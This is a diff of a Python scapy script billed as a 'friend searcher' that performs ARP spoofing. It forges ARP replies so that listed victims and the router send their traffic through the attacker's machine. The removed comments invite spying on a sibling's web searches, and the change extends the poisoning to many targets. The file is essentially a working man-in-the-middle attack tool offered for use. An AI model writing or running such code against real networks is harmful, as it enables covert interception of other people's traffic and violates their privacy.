@@ -1,11 +1,14 @@
 # Author: Yuval Rosenthal
-# A "friend searcher"
-# DO You WaNt To KnOW What yOUR bro SEaRchS OnlINE??????!??!!
-# Just WriTe DowN HIs Ip AND Open wIREsHArk LOL :D
-# THIS PROGRAM IS FOR RESEARCH PURPOSES(I.E pen-testing)
-
 from scapy.layers.l2 import *
 import netifaces
+
+# A "friend searcher"
+# BE WARNED DO NOT ATTACK THE SERVER!
+# LOOK AT BIG BROTHER BELOW      |
+#                                |
+#                                |
+#                               \|/
+#                                v
 
 #######################################################################
 #                                 /\                                  #
@@ -13,9 +16,9 @@ import netifaces
 #    ALWAYS WATCHING!           /    \                                #
 #                              /      \                               #
 #                             /  <()>  \                              #
-#                            /          \                             #
-#                           /            \                            #
-#                          /______________\                           #
+#                            /__________\                             #
+#                           /___|___|___|\                            #
+#                          /___|___|___|__\                           #
 #######################################################################
 
 BROADCAST_IP = 'ff:ff:ff:ff:ff:ff'  # The broadcast mac address
@@ -27,102 +30,90 @@ IS_AT_STATEMENT = 2
 
 class DeadlyArrows:
 
-    def start_bug(self, pack):
+    def __init__(self, list_addresses):
+        self.__addresses = list_addresses
+
+    def run(self):
         """
         Wait for the first question and reply alot :D
         """
 
         try:
 
-            self.divert_to_bug(pack)
+            self.divert_to_bug()
 
         except KeyboardInterrupt:
             print("You will be missed! :(")
             return
 
-    def divert_to_bug(self, pack):
+    def divert_to_bug(self):
         """
          Create 2 packets one will be sent from server to client the other from server to router
          Each packet states the latter destination belongs to the servers MAC address
          In short start the "bugging" of your "friend"
-        :param pack: the clients request packet
         """
 
-        response_to_your_friend = self.redirect_to_client(pack)
-        response_to_his_friend = self.redirect_to_router(pack)
+        response_to_your_friend = self.redirect_to_client()
+        response_to_his_friend = self.redirect_to_router()
 
-        print("You friend will be noticed:\n", response_to_your_friend.summary(),
-              "\nHis Friend will know:\n", response_to_his_friend.summary())
+      #  print("You friend will be noticed:\n", response_to_your_friend.summary(),
+      #        "\nHis Friend will know:\n", response_to_his_friend.summary())
 
-        response_to_your_friend.show()
-        response_to_his_friend.show()
+      #  response_to_your_friend.show()
+      #  response_to_his_friend.show()
 
         self.confuse(response_to_your_friend, response_to_his_friend)
 
-    def redirect_to_client(self, pack):
+    def redirect_to_client(self):
         """
          Create a response variable which will hold the packet sent to the client
-        :param pack: The clients request packet
         :return: The response -> client packet
         """
 
-        response = pack.copy()
-        response = self.create_impostor(response)
+        responses = self.create_impostor()
 
-        return response
+        return responses
 
-    def create_impostor(self, response):
+    def create_impostor(self):
         """
-        Create the response to client packet
-        :param response: The response packet
+         Create the response to client packet
         :return: The response packet
         """
 
-        client_ip = response[ARP].psrc
-        client_mac = response[Ether].src
+        responses = []
 
-        response[ARP].psrc = DEFAULT_GATEWAY
-        response[ARP].hwsrc = GODS_ADDRESS
-        response[Ether].src = GODS_ADDRESS
-        response[Ether].dst = client_mac
+        for address in self.__addresses:
+            pack = (Ether(src=GODS_ADDRESS, dst=address[1]) / ARP(hwsrc=GODS_ADDRESS, hwdst=address[1],
+                    psrc=DEFAULT_GATEWAY, pdst=address[0], op=IS_AT_STATEMENT))
+            responses.append(pack)
 
-        response[ARP].pdst = client_ip
-        response[ARP].hwdst = client_mac
-        response[ARP].op = IS_AT_STATEMENT
+        return responses
 
-        return response
-
-    def redirect_to_router(self, pack):
+    def redirect_to_router(self):
         """
          Create a response variable which will hold the packet sent to the router
-        :param pack: The clients request packet
         :return: The response -> router packet
         """
 
-        response = pack.copy()
-        response = self.create_him(response)
+        response = self.create_him()
 
         return response
 
-    def create_him(self, response):
+    def create_him(self):
         """
          Create the response to router packet
-        :param response: The response packet
         :return: The response packet
         """
 
-        router_ip = DEFAULT_GATEWAY
+        responses = []
 
-        response[ARP].psrc = response[ARP].psrc
-        response[ARP].hwsrc = GODS_ADDRESS
-        response[Ether].src = GODS_ADDRESS
-        response[Ether].dst = ROUTER_MAC
+        for address in self.__addresses:
+            pack = (Ether(src=GODS_ADDRESS, dst=ROUTER_MAC) / ARP(hwsrc=address[1], hwdst=ROUTER_MAC,
+                                                                  psrc=address[0], pdst=DEFAULT_GATEWAY,
+                                                                  op=IS_AT_STATEMENT))
+            responses.append(pack)
 
-        response[ARP].pdst = router_ip
-        response[ARP].hwdst = ROUTER_MAC
-        response[ARP].op = IS_AT_STATEMENT
-
-        return response
+        return responses
 
     def confuse(self, response_to_your_friend, response_to_his_friend):
         """
@@ -131,5 +122,5 @@ class DeadlyArrows:
         :param response_to_his_friend: Packet -> Router/ISP provider
         """
 
-        sendp(response_to_your_friend, count=500)
-        sendp(response_to_his_friend, count=500)
+        sendp(response_to_your_friend, count=5)
+        sendp(response_to_his_friend, count=5)
